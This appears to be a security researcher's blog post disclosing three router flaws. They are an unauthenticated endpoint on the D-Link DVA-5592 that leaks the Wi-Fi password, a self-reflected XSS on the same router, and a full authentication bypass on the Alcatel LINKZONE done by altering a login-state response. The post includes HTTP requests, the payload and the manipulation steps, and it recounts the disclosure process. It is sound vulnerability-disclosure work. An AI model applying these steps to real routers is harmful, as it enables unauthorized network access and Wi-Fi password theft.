<!DOCTYPE html>
<html>
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>

	
	  <link rel="shortcut icon" href="http://localhost:1313/favicon.ico?v=1">
	


	
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="HandheldFriendly" content="True">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />


	
	
	  <title>D-Link DVA-5592 missing authentication check [CVE-2019-6969] D-Link DVA-5592 Self XSS [CVE-2019-6968] Alcatel LINKZONE no authentication control whatsoever [CVE-2019-7163]</title>
	

	<link rel="me" href="https://infosec.exchange/@rhaidiz">


	
	
	  
		<link rel="stylesheet" href="/sass/toggle-button.css">
	  
	

	
	
	  
		<link rel="stylesheet" href="/sass/main.css">
	  
	

	
  
  <link rel="stylesheet" href="/sass/syntax-light.css" media="(prefers-color-scheme: light)">
  
  
  <link rel="stylesheet" href="/sass/syntax-dark.css" media="(prefers-color-scheme: dark)">

  
  
  
    <link rel="stylesheet" href="/sass/post.css">
  
  
  
  
  <link rel="preload" href="/fonts/Fira_Sans/FiraSans-Bold.woff2" as="font" type="font/woff2" crossorigin>
  
  
  <link rel="preload" href="/fonts/Fira_Sans/FiraSans-Regular.woff2" as="font" type="font/woff2" crossorigin>
  
  
  <link rel="preload" href="/fonts/Fira_Sans/FiraSans-ExtraLight.woff2" as="font" type="font/woff2" crossorigin>
  
  
  <link rel="preload" href="/fonts/Libre_Baskerville/libre-baskerville-v7-latin-regular.woff2" as="font" type="font/woff2" crossorigin>



</head>
  <body>

  <div>
    <div class="control">
    <label class="dark">
        <svg viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
          <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
          <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path>
        </svg>
      <input type="radio" class="darkradio" name="radio" value="dark" />
    </label>

    <label class="light">
        <svg viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
          <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
          <path d="M12 12m-4 0a4 4 0 1 0 8 0a4 4 0 1 0 -8 0"></path>
          <path d="M3 12h1m8 -9v1m8 8h1m-9 8v1m-6.4 -15.4l.7 .7m12.1 -.7l-.7 .7m0 11.4l.7 .7m-12.1 -.7l-.7 .7"></path>
        </svg>
      <input type="radio" class="lightradio" name="radio" value="light" />
    </label>

    <label class="auto">
  	<svg
      xmlns="http://www.w3.org/2000/svg"
      aria-hidden="true"
      width="1em"
      height="1em"
      class="theme-toggle__dark-inner"
      fill="currentColor"
      viewBox="0 0 32 32"
    >
      <path d="M16 9c3.9 0 7 3.1 7 7s-3.1 7-7 7" />
      <path d="M16 .5C7.4.5.5 7.4.5 16S7.4 31.5 16 31.5 31.5 24.6 31.5 16 24.6.5 16 .5zm0 28.1V23c-3.9 0-7-3.1-7-7s3.1-7 7-7V3.4C23 3.4 28.6 9 28.6 16S23 28.6 16 28.6z" />
    </svg>
      <input type="radio" class="autoradio" name="radio" checked value="auto" />
    </label>
  </div>
</div>

<script>
  
  const radios = document.querySelectorAll('input[name="radio"]');
  
  radios.forEach(radio => {
    radio.addEventListener('change', () => {
      let valueToStore;
  
      switch (radio.value) {
        case 'light':
          valueToStore = 'light';
          break;
  
        case 'dark':
          valueToStore = 'dark';
          break;
  
        case 'auto':
          valueToStore = 'auto';
          break;
      }
  
      localStorage.setItem('selectedOption', valueToStore);
    });
  });

  const savedValue = localStorage.getItem('selectedOption') ?? 'auto';
  if (savedValue == 'dark') {
	document.getElementsByClassName('darkradio')[0].click();
  } else if (savedValue == 'light') {
	document.getElementsByClassName('lightradio')[0].click();
  } else {
  document.getElementsByClassName('autoradio')[0].click();
  }
  
</script>
	
  <div class="toplogo">
    <a href="/">
  	<img src="/logo.png" />
    </a>
  </div>
  
  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
    <header>
    </header>

    <div class="content" itemprop="articleBody">
  	<time datetime="2019-02-27">Feb 27, 2019</time>
  	<h1>D-Link DVA-5592 missing authentication check [CVE-2019-6969] D-Link DVA-5592 Self XSS [CVE-2019-6968] Alcatel LINKZONE no authentication control whatsoever [CVE-2019-7163]</h1>
	<div class="post-tags">
  
    <a href="/tags/wi-fi/" class="tag-badge">Wi-Fi</a>
  
    <a href="/tags/dribble/" class="tag-badge">Dribble</a>
  
    <a href="/tags/cache-poison/" class="tag-badge">Cache-Poison</a>
  
    <a href="/tags/wifi/" class="tag-badge">Wifi</a>
  
    <a href="/tags/dlink/" class="tag-badge">Dlink</a>
  
    <a href="/tags/d-link/" class="tag-badge">D-Link</a>
  
    <a href="/tags/dva-5592/" class="tag-badge">Dva-5592</a>
  
    <a href="/tags/alcatel/" class="tag-badge">Alcatel</a>
  
    <a href="/tags/linkzone/" class="tag-badge">LINKZONE</a>
  
    <a href="/tags/mw40-v-v1/" class="tag-badge">MW40-v-V1</a>
  
    <a href="/tags/cve-2019-6968/" class="tag-badge">Cve-2019-6968</a>
  
    <a href="/tags/cve-2019-6969/" class="tag-badge">Cve-2019-6969</a>
  
    <a href="/tags/cve-2019-7163/" class="tag-badge">Cve-2019-7163</a>
  
</div>

  	<p><strong>DISCLAIMER:</strong> The author is not responsible for the misuse of the information contained in this post.</p>
<p>This is a long-overdue post describing some vulnerabilities that I found while working on <a href="/2018/10/25/dribble-stealing-wifi-password-via-browsers-cache-poisoning/">project Dribble</a>. Let me start by giving a very brief context so that you&rsquo;ll be able to follow this post without needing to know all the details of Dribble. The basic idea behind Dribble is to cache JavaScript code in the victim&rsquo;s browser while connected to a rouge access point. When the victim gets home, the cached JavaScript code will try to access the victim&rsquo;s router in order to retrieve the Wi-Fi password. Dribble thus brute-forces the login page of the web interface of the victim&rsquo;s router. In order to implement the brute-forcer, I had to investigate the login process of the routers I had at my disposal. At first, I had access only to my personal router, the D-Link DVA-5592, than I could also get my hands on the Alcatel Linkzone MW40-V-V1.0 which was given to me by my ISP along with a SIM card. Incredibly enough, both routers present some kind of authentication bypass thus not properly verifying that the user is logged in before providing sensitive information such as the Wi-Fi password. Let&rsquo;s get into it.</p>
<style>
@font-face {
  font-family: "Harry";
  src: url(/fonts/hp.ttf) format("truetype");
}
</style>
<h2 id="cve-2019-6969-d-link-dva-5592-missing-authentication-control">[CVE-2019-6969] D-Link DVA-5592 Missing authentication control</h2>
<p>The Dlink DVA-5592 shows a status page right after logging in. This page contains, as shown below, sensitive information such as the password of the Wi-Fi.</p>
<p><img src="/images/status.png" alt=""></p>
<p>The URL for the status page is http://192.168.X.X/ui/status/ and if one tries to access it without being logged in, they are redirected to the login form.
The login page, as you might have noticed, has a language button in the up-right corner that, surprise surprive, is used to change the language of the interface. Changing the language causes a request been performed to the following URL: <code>http://192.168.X.X/ui/status/content?lang=YY</code>
See the <code>content</code> path right after <code>status</code>?
The response obtained from requesting that URL contains, not only the translated text for the language selected, but also the sensitive information I carefully redacted in the screenshot above. Whenever I see the possibility of accessing the same information from different paths, I automatically check if these paths properly verify that the request is coming from an authenticated user.
Since I&rsquo;m bringing this up, it turns out that if you request <code>http://192.168.X.X/ui/status/content</code>, the router&rsquo;s web interface does not check the session cookie, meaning that Dribble, or anybody else connected to the router, does not even need to brute-force the login page to have access to the Wi-Fi password.</p>
<p><img src="/images/status-content.png" alt=""></p>
<iframe src="https://giphy.com/embed/l41Ywr3dQBOujzU7m" width="100%" height="360" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p style="text-align:center;font-size:0.7em"><a href="https://giphy.com/gifs/l41Ywr3dQBOujzU7m">via GIPHY</a></p>
<p>This is particularly interesting not only for Dribble, but also in a scenario where the DVA-5592 is configured to have a guest Wi-Fi network with hosts isolation enabled. Users connected to the guest Wi-Fi can easly retrieve the password for the &ldquo;main&rdquo; Wi-Fi network and have unauthorized access to it.</p>
<h2 id="cve-2019-6968-d-link-dva-5592-self-reflected-cross-site-scripting">[CVE-2019-6968] D-Link DVA-5592 Self Reflected Cross-Site Scripting</h2>
<p>Nothing really special here. While playing with the D-Link DVA-5592 I tought about messing aroud a little with some parameters to see if I could find something else. It turns out that some parameters are vulnerable to Reflected Cross-Site Scripting. It also turns out that there&rsquo;s a parameter called <code>action__key</code> which acts as a Cross-Site Request Forgery token which makes the Reflected Cross-Site Scripting to fall into the &ldquo;Self&rdquo; category. The issue is spread thruought the all web interface and gets triggered whenever an input generates an error and the same input is reflected in the same form along with the error message.</p>
<p>Here I show an example of the vulnerability in the page used to creare a new user for accessing a shared folder. If the username is something like <code>a&quot;&gt;&lt;script&gt;alert('xss');&lt;/script&gt;</code>, the web interface generates an error and reflects back the value of the username back in the input form.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">POST /ui/dboard/storage/storageusers/addstorageusers HTTP/1.1
</span></span><span class="line"><span class="cl">Host: 192.168.100.1
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span></span><span class="line"><span class="cl">Accept-Language: en-US,en;q=0.5
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
</span></span><span class="line"><span class="cl">Referer: http://192.168.100.1/ui/dboard/storage/storageusers/addstorageusers
</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
</span></span><span class="line"><span class="cl">Content-Length: 157
</span></span><span class="line"><span class="cl">Connection: close
</span></span><span class="line"><span class="cl">Cookie: sid=8838526573981467247
</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">enable=true<span class="err">&amp;</span>username=az%5C<span class="err">&amp;</span>password=a%22%3E%3Cscript%3Ealert%28%27xss%27%29%3B%3C%2Fscript%3E<span class="err">&amp;</span>passwordShow=on<span class="err">&amp;</span>action__key=1587374836_1442851124<span class="err">&amp;</span>apply=Applica
</span></span></code></pre></div><p>The response being the following where you can see the payload being reflected.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">HTTP/1.1 200 OK
</span></span><span class="line"><span class="cl">Date: Thu, 24 Jan 2019 11:19:25 UTC
</span></span><span class="line"><span class="cl">Server: HTTP Server
</span></span><span class="line"><span class="cl">X-Frame-Options: DENY
</span></span><span class="line"><span class="cl">Connection: close
</span></span><span class="line"><span class="cl">Content-Language: en
</span></span><span class="line"><span class="cl">Content-Type: text/html
</span></span><span class="line"><span class="cl">Cache-Control: no-cache
</span></span><span class="line"><span class="cl">Pragma: no-cache
</span></span><span class="line"><span class="cl">Expires: -1
</span></span><span class="line"><span class="cl">Content-Length: 6829
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html PUBLIC &#34;-//W3C//DTD XHTML 1.0 Strict//EN&#34; &#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&#34;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">&#34;http://www.w3.org/1999/xhtml&#34;</span> <span class="na">xml:lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">[...]
</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Residential Gateway - D-Link<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[...]
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;formField&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;password&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;password&#34;</span><span class="p">&gt;</span>Password:<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;passwordField&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">autocomplete</span><span class="o">=</span><span class="s">&#34;off&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;a&#34;</span><span class="p">&gt;&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;xss&#39;</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>&#34; autocomplete=&#39;off&#39;/&gt;
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;text&#39;</span> <span class="na">style</span><span class="o">=</span><span class="s">&#39;visibility:hidden&#39;</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#39;checkbox&#39;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;passwordShow&#39;</span> <span class="na">tabindex</span><span class="o">=</span><span class="s">&#39;-1&#39;</span><span class="p">/&gt;</span> mostra password<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nx">fieldPassword</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">,</span> <span class="s1">&#39;passwordShow&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;formField&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;</span>Seleziona Gruppi:<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;texterror&#39;</span><span class="p">&gt;</span>Groups not configured<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">fieldset</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;buttons&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">[...]
</span></span></code></pre></div><p>Which ultimately shows the canonical alert box.</p>
<p><img src="/images/dlink-xss.png" alt=""></p>
<iframe src="https://giphy.com/embed/12NUbkX6p4xOO4" width="100%" height="440" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p style="text-align:center;font-size:0.7em"><a href="https://giphy.com/gifs/shia-labeouf-12NUbkX6p4xOO4">via GIPHY</a></p>
<h2 id="cve-2019-7163-alcatel-linkzone-mw40-v-v10-authentication-control-so-much-not-implemented">[CVE-2019-7163] Alcatel LINKZONE MW40-V-V1.0 authentication control so much not implemented</h2>
<p>This issue was the one that made me chuckle, a complete authentication bypass of the web interface of the Alcatel LINKZONE MW40-V-V1.0.  Just a quick recap: I was looking into the login process of the Alcatel LINKZONE MW40-V-V1.0 to implement a brute-forcer to include in Dribble. First of, the web interface of the Alcatel LINKZONE MW40-V-V1.0, by default, is not password protected.</p>
<iframe src="https://giphy.com/embed/NvgkEvycaWhPi" width="100%" height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p style="text-align:center;font-size:0.7em"><a href="https://giphy.com/gifs/mrw-rub-softcore-NvgkEvycaWhPi">via GIPHY</a></p>
<p>This already makes live easy for the general use case of Dribble but, of course, I wanted to make sure that the whole thing could work also when the user had setup a password. Once you start to analyze the HTTP traffic, you soon learn that the front-end uses the JSON-RPC standard to communicate with the back-end. The whole front-end is downloaded the first time you visit the web interface and after that, all the info related to the status of the router are retrieved with specifically crafted JSON-RPC calls. All I needed, was to find the request that accessed the Wi-Fi password, and soon enough I found it to be this one:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">POST http://192.168.1.1/jrd/webapi HTTP/1.1
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0
</span></span><span class="line"><span class="cl">Accept: application/json, text/plain, */*
</span></span><span class="line"><span class="cl">Accept-Language: en-US,en;q=0.5
</span></span><span class="line"><span class="cl">Referer: http://192.168.1.1/index.html
</span></span><span class="line"><span class="cl">_TclRequestVerificationToken: bf16bgno22;1Y[QZ
</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded; charset=UTF-8
</span></span><span class="line"><span class="cl">Content-Length: 65
</span></span><span class="line"><span class="cl">Connection: keep-alive
</span></span><span class="line"><span class="cl">Host: 192.168.1.1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">{&#34;jsonrpc&#34;:&#34;2.0&#34;,&#34;method&#34;:&#34;GetWlanSettings&#34;,&#34;params&#34;:{},&#34;id&#34;:&#34;1&#34;}
</span></span></code></pre></div><p>Nice, the value for <code>_TclRequestVeerificationToken</code> seems to be some sort of verification token, so now what I need is to find out how that token is generated.
However, before I could even start looking into it, another request caught my attention:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">POST http://192.168.1.1/jrd/webapi HTTP/1.1
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
</span></span><span class="line"><span class="cl">Accept: application/json, text/plain, */*
</span></span><span class="line"><span class="cl">Accept-Language: en-US,en;q=0.5
</span></span><span class="line"><span class="cl">Referer: http://192.168.1.1/index.html
</span></span><span class="line"><span class="cl">_TclRequestVerificationToken: bf16bgno22;1Y[QZ
</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded; charset=UTF-8
</span></span><span class="line"><span class="cl">Content-Length: 63
</span></span><span class="line"><span class="cl">Connection: keep-alive
</span></span><span class="line"><span class="cl">Host: 192.168.1.1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">{&#34;jsonrpc&#34;:&#34;2.0&#34;,&#34;method&#34;:&#34;GetLoginState&#34;,&#34;params&#34;:{},&#34;id&#34;:&#34;1&#34;}
</span></span></code></pre></div><p>This request is generated whenever I want to perform any other action. It contains the <code>_TclRequestVerificationToken</code> even tough I&rsquo;m not logged in, weird. Moreover, that <code>GetLoginState</code> seems interesting, and the response contains even more interesting stuff.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">HTTP/1.1 200 OK
</span></span><span class="line"><span class="cl">Content-Type: application/json
</span></span><span class="line"><span class="cl">X-Frame-Options: SAMEORIGIN
</span></span><span class="line"><span class="cl">x-xss-protection: 1; mode=block
</span></span><span class="line"><span class="cl">Content-Length: 109
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">{ &#34;jsonrpc&#34;: &#34;2.0&#34;, &#34;result&#34;: { &#34;State&#34;: 0, &#34;LoginRemainingTimes&#34;: 3, &#34;LockedRemainingTime&#34;: 0 }, &#34;id&#34;: &#34;1&#34; }
</span></span></code></pre></div><p>You are telling me that the front-end is asking <code>GetLoginState</code>, the request already contains the value for <code>_TclRequestVerificationToken</code> without being logged in, and the back-end is answering with <code>&quot;State&quot;: 0</code> &hellip;</p>
<p>The front-end is simply &ldquo;blocking&rdquo; what are suppose to be unauthenticated users from viewing the content of the web interface. All one needs to do is intercepting the response to the <code>GetLoginState</code> request and change the value of <code>State</code> from <code>0</code> to <code>1</code> and voilà&hellip; you are now logged in.</p>
<h2 id="disclosure">Disclosure</h2>
<p>This is the main reason why this post comes so late. Here&rsquo;s the deal: I contacted Alcatel to notify the vulnerability, but Alcatel doesn&rsquo;t seem to have a security response team. I figured I would give a try with the &ldquo;general&rdquo; support team. They answered pretty fast but they couldn&rsquo;t really understand what I was trying to tell them. I thus shot a short video showing that it was possible to have access to the router without knowing the password. They finally told me that they would look into it but there wouldn&rsquo;t be any further communication from their side.</p>
<p>D-Link, on the other hand, does have a Security Incident Report Team. I contacted them and provided all the details of the two issues and they told me to ask for the CVEs myself and that they would contact me after looking into the issues. They also said it shouldn&rsquo;t take longer than a few days. Over a month and several e-mails later &hellip; still no news from their side.</p>
<p>So what about the CVEs then? CVEs are like Pokémon gym badges, <a href="https://bulbapedia.bulbagarden.net/wiki/Obedience#Badges">the more you have the more Pokémon will respect you</a> &hellip;</p>
<iframe src="https://giphy.com/embed/wrBURfbZmqqXu" width="100%" height="319" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p style="text-align:center;font-size:0.7em"><a href="https://giphy.com/gifs/reaction-wrBURfbZmqqXu">via GIPHY</a></p>
<p>It took quite sometime and many email from my side but eventually MITRE published the CVEs and I got my badges:</p>
<ul>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-6968">CVE-2019-6968</a></li>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-6969">CVE-2019-6969</a></li>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7163">CVE-2019-7163</a></li>
</ul>
<h2 id="wrapping-up">Wrapping up</h2>
<p>While looking for ways to easily get the Wi-Fi password from the only two routers I have constant access to (a D-Link DVA-5592 and an Alcatel LINKZONE), I discovered that both do not correctly implement an authentication mechanism. For the D-Link this is &ldquo;limited&rdquo; to a status page which also contains the password of the Wi-Fi in clear text. The Alcatel, on the other hand, lacks of proper authentication entirely which results in a complete takeover of the web interface.</p>
<p>I am very happy I finally managed to find the time to implement Dribble, not only because it was in my TO-DO list for a very long time and I could finally scratch it off (I really like to scratch things off), but also because working on it resulted in some collateral findings, which I believe to be a very satisfying way to discover something new.</p>
<div style="text-align:center;font-family:Harry;font-size:5em">mischief managed</div>

    </div>
  </article>


  </body>
</html>
